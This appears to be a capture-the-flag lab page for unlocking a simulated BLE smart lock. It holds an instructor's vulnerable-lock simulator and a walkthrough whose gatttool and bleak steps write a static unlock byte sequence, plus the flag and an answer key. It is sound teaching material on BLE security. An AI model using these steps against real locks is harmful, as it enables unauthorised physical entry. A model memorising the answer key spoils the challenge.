---
title: "Challenge: Unlock the BLE Lock"
level: Advanced
description: "A smart lock uses BLE for authentication. Bypass it."
points: 300
hints:
  - "Enumerate all GATT characteristics"
  - "Look for writable characteristics without authentication"
  - "The unlock command is a simple byte sequence"
---

# Challenge: Unlock the BLE Lock

## Scenario

A building in your client's office uses BLE-enabled smart locks on every door. The manufacturer claims the locks are "military-grade encrypted," but your team suspects otherwise. A test lock has been set up in the lab for you to evaluate. Your mission is to connect to the lock over BLE, reverse-engineer the locking protocol, and send the unlock command -- all without knowing the legitimate PIN or having the mobile app.

## Objectives

1. Discover the BLE lock device.
2. Connect and enumerate all GATT services and characteristics.
3. Identify the characteristic that controls the lock mechanism.
4. Determine the correct byte sequence to unlock the lock.
5. Retrieve the flag displayed when the lock opens.

## Rules

- You may use any BLE tools: `bluetoothctl`, `gatttool`, `bettercap`, `bleak` (Python), nRF Connect.
- The flag format is `FLAG{some_text_here}`.
- Do not attempt to jam or interfere with other Bluetooth devices.
- Time limit: 45 minutes.

## Equipment

- Your Linux laptop with a Bluetooth 4.0+ adapter
- The target BLE lock (within range at your workstation)

---

## Challenge Environment Setup (For Instructors)

This challenge uses a simulated BLE lock running on an ESP32 or a Linux machine with a BLE adapter. Below is a Python-based BLE peripheral using `bless` that simulates the lock.

### Option A: Linux-based BLE peripheral simulator

Install the required library:

```bash
pip3 install bless
```

Create the simulated lock:

```bash
cat << 'PYEOF' > /tmp/ble_lock_sim.py
#!/usr/bin/env python3
"""
BLE Smart Lock Simulator for CTF Challenge.
Exposes GATT services mimicking a vulnerable smart lock.
"""

import asyncio
import logging
from bless import BlessServer, BlessGATTCharacteristic, GATTCharacteristicProperties, GATTAttributePermissions

logging.basicConfig(level=logging.INFO)

# UUIDs
LOCK_SERVICE_UUID        = "0000FF10-0000-1000-8000-00805f9b34fb"
LOCK_STATE_CHAR_UUID     = "0000FF11-0000-1000-8000-00805f9b34fb"  # Read: lock state
LOCK_COMMAND_CHAR_UUID   = "0000FF12-0000-1000-8000-00805f9b34fb"  # Write: lock command
LOCK_FLAG_CHAR_UUID      = "0000FF13-0000-1000-8000-00805f9b34fb"  # Read: flag (after unlock)
DEVICE_INFO_SERVICE_UUID = "0000180A-0000-1000-8000-00805f9b34fb"
MODEL_CHAR_UUID          = "00002A24-0000-1000-8000-00805f9b34fb"
FIRMWARE_CHAR_UUID       = "00002A26-0000-1000-8000-00805f9b34fb"
BATTERY_SERVICE_UUID     = "0000180F-0000-1000-8000-00805f9b34fb"
BATTERY_LEVEL_CHAR_UUID  = "00002A19-0000-1000-8000-00805f9b34fb"

# Lock state
lock_state = {"locked": True}

def on_write(characteristic: BlessGATTCharacteristic, value: bytearray, **kwargs):
    """Handle writes to the lock command characteristic."""
    hex_val = value.hex()
    logging.info(f"Write received on {characteristic.uuid}: {hex_val}")

    if characteristic.uuid == LOCK_COMMAND_CHAR_UUID:
        # The unlock command: 0xA0, 0x55, 0x01
        if value == bytearray([0xA0, 0x55, 0x01]):
            lock_state["locked"] = False
            logging.info("[+] LOCK OPENED! Flag is now readable.")
        # The lock command: 0xA0, 0x55, 0x00
        elif value == bytearray([0xA0, 0x55, 0x00]):
            lock_state["locked"] = True
            logging.info("[-] Lock re-engaged.")
        else:
            logging.info(f"[-] Invalid command: {hex_val}")

def on_read(characteristic: BlessGATTCharacteristic, **kwargs) -> bytearray:
    """Handle reads from characteristics."""
    if characteristic.uuid == LOCK_STATE_CHAR_UUID:
        state = b'\x01' if lock_state["locked"] else b'\x00'
        logging.info(f"Lock state read: {'LOCKED' if lock_state['locked'] else 'UNLOCKED'}")
        return bytearray(state)
    elif characteristic.uuid == LOCK_FLAG_CHAR_UUID:
        if lock_state["locked"]:
            return bytearray(b'ACCESS DENIED - Lock is engaged')
        else:
            return bytearray(b'FLAG{bl3_l0ck_byp4ss3d_n0_4uth}')
    elif characteristic.uuid == MODEL_CHAR_UUID:
        return bytearray(b'SmartLock Pro X1')
    elif characteristic.uuid == FIRMWARE_CHAR_UUID:
        return bytearray(b'v2.1.3-release')
    elif characteristic.uuid == BATTERY_LEVEL_CHAR_UUID:
        return bytearray([87])  # 87% battery
    return bytearray(b'')

async def main():
    server = BlessServer(name="SmartLock-X1")
    server.write_request_func = on_write
    server.read_request_func = on_read

    await server.add_new_service(LOCK_SERVICE_UUID)

    await server.add_new_characteristic(
        LOCK_SERVICE_UUID, LOCK_STATE_CHAR_UUID,
        GATTCharacteristicProperties.read,
        None, GATTAttributePermissions.readable
    )
    await server.add_new_characteristic(
        LOCK_SERVICE_UUID, LOCK_COMMAND_CHAR_UUID,
        GATTCharacteristicProperties.write,
        None, GATTAttributePermissions.writeable
    )
    await server.add_new_characteristic(
        LOCK_SERVICE_UUID, LOCK_FLAG_CHAR_UUID,
        GATTCharacteristicProperties.read,
        None, GATTAttributePermissions.readable
    )

    await server.add_new_service(DEVICE_INFO_SERVICE_UUID)
    await server.add_new_characteristic(
        DEVICE_INFO_SERVICE_UUID, MODEL_CHAR_UUID,
        GATTCharacteristicProperties.read,
        None, GATTAttributePermissions.readable
    )
    await server.add_new_characteristic(
        DEVICE_INFO_SERVICE_UUID, FIRMWARE_CHAR_UUID,
        GATTCharacteristicProperties.read,
        None, GATTAttributePermissions.readable
    )

    await server.add_new_service(BATTERY_SERVICE_UUID)
    await server.add_new_characteristic(
        BATTERY_SERVICE_UUID, BATTERY_LEVEL_CHAR_UUID,
        GATTCharacteristicProperties.read,
        None, GATTAttributePermissions.readable
    )

    await server.start()
    logging.info("BLE Lock Simulator is running. Ctrl+C to stop.")
    logging.info("Unlock command: write A05501 to FF12 characteristic")

    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    finally:
        await server.stop()

asyncio.run(main())
PYEOF
```

Run the simulator:

```bash
python3 /tmp/ble_lock_sim.py
```

### Option B: ESP32-based hardware simulator

Flash an ESP32 with the Arduino BLE library using equivalent GATT services. See the instructor supplement for the Arduino sketch.

---

## Getting Started

You know there is a BLE smart lock nearby called "SmartLock-X1." Think about:

- How do you discover BLE devices in range?
- Once connected, how do you find out what services and characteristics the device exposes?
- Which characteristics can you read? Which can you write?
- What happens when you read each characteristic?
- Can you figure out the correct byte sequence to write?

---

<details>
<summary><strong>Hint 1 (click to reveal)</strong></summary>

Start by scanning for BLE devices:

```bash
sudo bluetoothctl
[bluetooth]# scan on
```

Look for a device named "SmartLock-X1" and note its MAC address. Then use `gatttool` to enumerate:

```bash
gatttool -b <MAC_ADDRESS> -I
> connect
> primary
> characteristics
```

</details>

<details>
<summary><strong>Hint 2 (click to reveal)</strong></summary>

After enumerating characteristics, you will see a vendor-specific service with UUID `0000FF10-...`. It has three characteristics:

- `FF11` -- Read: returns the lock state (`01` = locked, `00` = unlocked)
- `FF12` -- Write: accepts a command to control the lock
- `FF13` -- Read: returns either "ACCESS DENIED" or the flag

Focus on `FF12`. No authentication is required to write to it.

</details>

<details>
<summary><strong>Hint 3 (click to reveal)</strong></summary>

The unlock command is a 3-byte sequence. The protocol uses:
- `0xA0` -- Command prefix
- `0x55` -- Device identifier
- `0x01` -- Action (01 = unlock, 00 = lock)

Write `A05501` to the command characteristic.

</details>

---

<details>
<summary><strong>Full Walkthrough (click to reveal)</strong></summary>

### Step 1: Scan for the lock

```bash
sudo bluetoothctl
[bluetooth]# scan on
```

Wait for the device to appear:

```
[NEW] Device AA:BB:CC:DD:EE:FF SmartLock-X1
```

Note the MAC address (`AA:BB:CC:DD:EE:FF` in this example). Stop scanning:

```
[bluetooth]# scan off
[bluetooth]# exit
```

### Step 2: Connect and enumerate GATT services

```bash
gatttool -b AA:BB:CC:DD:EE:FF -I
```

```
[AA:BB:CC:DD:EE:FF][LE]> connect
Connection successful

[AA:BB:CC:DD:EE:FF][LE]> primary
attr handle: 0x0001, end grp handle: 0x0009 uuid: 0000ff10-0000-1000-8000-00805f9b34fb
attr handle: 0x000a, end grp handle: 0x0010 uuid: 0000180a-0000-1000-8000-00805f9b34fb
attr handle: 0x0011, end grp handle: 0x0014 uuid: 0000180f-0000-1000-8000-00805f9b34fb
```

Three services are present:
- `0xFF10` -- Vendor-specific (the lock service)
- `0x180A` -- Device Information
- `0x180F` -- Battery Service

### Step 3: Enumerate characteristics

```
[AA:BB:CC:DD:EE:FF][LE]> characteristics
handle: 0x0002, char properties: 0x02, char value handle: 0x0003, uuid: 0000ff11-...
handle: 0x0004, char properties: 0x08, char value handle: 0x0005, uuid: 0000ff12-...
handle: 0x0006, char properties: 0x02, char value handle: 0x0007, uuid: 0000ff13-...
handle: 0x000b, char properties: 0x02, char value handle: 0x000c, uuid: 00002a24-...
handle: 0x000d, char properties: 0x02, char value handle: 0x000e, uuid: 00002a26-...
handle: 0x0012, char properties: 0x02, char value handle: 0x0013, uuid: 00002a19-...
```

Analysis of the lock service (`FF10`):
- `FF11` (handle 0x0003) -- Properties: 0x02 (Read) -- Lock state
- `FF12` (handle 0x0005) -- Properties: 0x08 (Write) -- Lock command
- `FF13` (handle 0x0007) -- Properties: 0x02 (Read) -- Flag/status

### Step 4: Read the lock state

```
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0003
Characteristic value/descriptor: 01
```

`01` means the lock is currently locked.

### Step 5: Try to read the flag

```
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0007
Characteristic value/descriptor: 41 43 43 45 53 53 20 44 45 4e 49 45 44 ...
```

Decode:

```bash
echo "41 43 43 45 53 53 20 44 45 4e 49 45 44" | xxd -r -p
# Output: ACCESS DENIED - Lock is engaged
```

The flag is only available when the lock is unlocked.

### Step 6: Read device information (reconnaissance)

```
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x000c
Characteristic value/descriptor: 53 6d 61 72 74 4c 6f 63 6b 20 50 72 6f 20 58 31
```

Decode: `SmartLock Pro X1`

```
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x000e
Characteristic value/descriptor: 76 32 2e 31 2e 33 2d 72 65 6c 65 61 73 65
```

Decode: `v2.1.3-release`

### Step 7: Determine the unlock command

The writable characteristic is `FF12` at handle `0x0005`. Since we do not have documentation, we need to experiment. Try common single-byte commands:

```
> char-write-req 0x0005 01
> char-read-hnd 0x0003
Characteristic value/descriptor: 01
```

Still locked. The lock expects a specific multi-byte sequence.

Researching similar cheap BLE locks (or through protocol analysis with a BLE sniffer while using the legitimate app), you would find that many use a command prefix + device ID + action byte pattern.

Try the pattern `A0 55 01`:

```
[AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x0005 a05501
Characteristic value was written successfully
```

### Step 8: Verify and read the flag

Check the lock state:

```
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0003
Characteristic value/descriptor: 00
```

`00` -- the lock is now unlocked.

Read the flag:

```
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0007
Characteristic value/descriptor: 46 4c 41 47 7b 62 6c 33 5f 6c 30 63 6b 5f 62 79 70 34 73 73 33 64 5f 6e 30 5f 34 75 74 68 7d
```

Decode:

```bash
echo "46 4c 41 47 7b 62 6c 33 5f 6c 30 63 6b 5f 62 79 70 34 73 73 33 64 5f 6e 30 5f 34 75 74 68 7d" | xxd -r -p
```

**Output:**

```
FLAG{bl3_l0ck_byp4ss3d_n0_4uth}
```

### Alternative approach using Python (bleak)

```python
import asyncio
from bleak import BleakClient

LOCK_CMD_UUID  = "0000ff12-0000-1000-8000-00805f9b34fb"
LOCK_FLAG_UUID = "0000ff13-0000-1000-8000-00805f9b34fb"

async def unlock(address):
    async with BleakClient(address) as client:
        # Send unlock command
        await client.write_gatt_char(LOCK_CMD_UUID, bytearray([0xA0, 0x55, 0x01]))
        print("[+] Unlock command sent")

        # Read the flag
        flag = await client.read_gatt_char(LOCK_FLAG_UUID)
        print(f"[+] Flag: {flag.decode()}")

asyncio.run(unlock("AA:BB:CC:DD:EE:FF"))
```

### What you learned

- The lock requires no pairing or authentication to connect.
- The command characteristic is writable by any BLE client -- no access control.
- The unlock command is a simple static byte sequence with no challenge-response, nonce, or session token.
- Any attacker within BLE range (up to ~100 meters in open air) can unlock this lock.
- Real-world mitigations would include mutual authentication, encrypted command channels, rolling codes, or challenge-response protocols.

</details>

---

## Scoring

| Criteria | Points |
|----------|--------|
| Discovered the BLE lock device | 30 |
| Successfully connected and enumerated GATT services | 40 |
| Identified the writable command characteristic | 50 |
| Sent the correct unlock command | 80 |
| Retrieved the flag | 50 |
| Documented the security vulnerabilities (bonus) | 50 |
| **Total** | **300** |
